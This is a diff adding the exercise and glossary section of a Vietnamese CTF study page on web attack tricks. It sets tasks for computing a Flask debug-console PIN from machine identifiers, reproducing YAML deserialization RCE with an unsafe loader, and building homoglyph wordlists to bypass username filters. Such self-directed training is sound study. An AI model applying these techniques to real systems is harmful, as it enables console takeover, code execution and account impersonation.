+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 Flask app với <code>debug=True</code>, tự tính PIN bằng script (A) với
+  đủ 5 giá trị input lấy trực tiếp từ máy mình (không cần LFI vì bạn CÓ quyền truy cập trực tiếp), xác nhận
+  khớp với PIN hiển thị trên console.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>uuid.getnode()</code> chạy ngay trong Python để lấy MAC, và
+  <code>cat /etc/machine-id</code> để lấy machine_id — chạy trực tiếp trên máy host app.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thử payload YAML RCE (mục 06.B) trên 1 script nhỏ tự viết dùng
+  <code>yaml.load(data, Loader=yaml.Loader)</code> (không an toàn), xác nhận RCE chạy.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>pip install pyyaml</code>, nhớ dùng đúng
+  <code>Loader=yaml.Loader</code> (không phải <code>SafeLoader</code>) để tái tạo lỗ hổng.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> thiết kế 1 wordlist các cặp ký tự Unicode "trông giống" (homoglyph) phổ
+  biến nhất (Latin vs Cyrillic vs Greek) để tự động fuzz bypass filter username — giải thích vì sao kỹ thuật
+  này đặc biệt nguy hiểm cho các check liên quan tới TÊN NGƯỜI DÙNG (impersonation) hơn là các loại filter
+  khác.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Homoglyph nguy hiểm hơn ở việc "trông giống" gây nhầm lẫn cho CON
+  NGƯỜI (admin xem log thấy tên "admin" tưởng là tài khoản thật), không chỉ bypass filter của MÁY — đây là
+  khác biệt quan trọng so với các kỹ thuật encoding khác.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Debug mode</td><td>Chế độ hiện chi tiết lỗi/cấp quyền debug cho dev, nguy hiểm nếu còn bật ở production.</td></tr>
+    <tr><td>HPP (HTTP Parameter Pollution)</td><td>Gửi tham số trùng tên nhiều lần để lợi dụng cách xử lý khác nhau giữa các lớp.</td></tr>
+    <tr><td>Homoglyph</td><td>Ký tự khác hệ chữ nhưng trông giống nhau khi hiển thị (vd Cyrillic "а" vs Latin "a").</td></tr>
+  </table>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("langtricks-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("langtricks-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
